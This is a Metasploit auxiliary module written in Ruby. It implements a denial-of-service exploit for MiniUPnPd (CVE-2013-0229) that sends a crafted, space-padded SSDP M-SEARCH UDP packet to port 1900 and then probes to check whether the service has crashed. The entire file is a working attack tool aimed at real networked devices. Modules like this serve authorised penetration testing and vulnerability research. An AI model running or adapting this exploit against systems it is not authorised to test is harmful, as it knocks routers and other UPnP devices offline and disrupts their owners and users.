##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MiniUPnPd 1.4 Denial of Service (DoS) Exploit',
      'Description'    => %q{
          This module allows remote attackers to cause a denial of service (DoS)
          in MiniUPnP 1.0 server via a specifically crafted UDP request.
      },
      'Author'         =>
        [
          'hdm', # Vulnerability discovery
          'Dejan Lukan' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2013-0229' ],
          [ 'OSVDB', '89625' ],
          [ 'BID', '57607' ],
          [ 'URL', 'https://community.rapid7.com/servlet/JiveServlet/download/2150-1-16596/SecurityFlawsUPnP.pdf' ]
        ],
      'DisclosureDate' => 'Mar 27 2013',
    ))

    register_options(
    [
      Opt::RPORT(1900),
      OptInt.new('ATTEMPTS', [true, 'Max number of attempts to DoS the remote MiniUPnP ending', 3 ])
    ])
  end

  def send_probe(udp_sock, probe)
    udp_sock.put(probe)
    data = udp_sock.recvfrom
    if data and not data[0].empty?
      return data[0]
    else
      return nil
    end
  end

  def run
    # the M-SEARCH probe packet that tries to identify whether the service is up or not
    msearch_probe = "M-SEARCH * HTTP/1.1\r\n"
    msearch_probe << "Host:239.255.255.250:1900\r\n"
    msearch_probe << "ST:upnp:rootdevice\r\n"
    msearch_probe << "Man:\"ssdp:discover\"\r\n"
    msearch_probe << "MX:3\r\n"
    msearch_probe << "\r\n"

    # the M-SEARCH packet that is being read line by line: there shouldn't be CRLF after the
    # ST line
    sploit = "M-SEARCH * HTTP/1.1\r\n"
    sploit << "HOST: 239.255.255.250:1900\r\n"
    sploit << "ST:uuid:schemas:device:MX:3"
    # the packet can be at most 1500 bytes long, so add appropriate number of ' ' or '\t'
    # this makes the DoS exploit more probable, since we're occupying the stack with arbitrary
    # characters: there's more chance that the the program will run off the stack.
    sploit += ' '*(1500-sploit.length)


    # connect to the UDP port
    connect_udp

    print_status("#{rhost}:#{rport} - Checking UPnP...")
    response = send_probe(udp_sock, msearch_probe)
    if response.nil?
      print_error("#{rhost}:#{rport} - UPnP end not found")
      disconnect_udp
      return
    end

    (1..datastore['ATTEMPTS']).each { |attempt|
      print_status("#{rhost}:#{rport} - UPnP DoS attempt #{attempt}...")

      # send the exploit to the target
      print_status("#{rhost}:#{rport} - Sending malformed packet...")
      udp_sock.put(sploit)

      # send the probe to the target
      print_status("#{rhost}:#{rport} - The target should be unresponsive now...")
      response = send_probe(udp_sock, msearch_probe)
      if response.nil?
        print_good("#{rhost}:#{rport} - UPnP unresponsive")
        disconnect_udp
        return
      else
        print_status("#{rhost}:#{rport} - UPnP is responsive still")
      end
    }

    disconnect_udp
  end
end
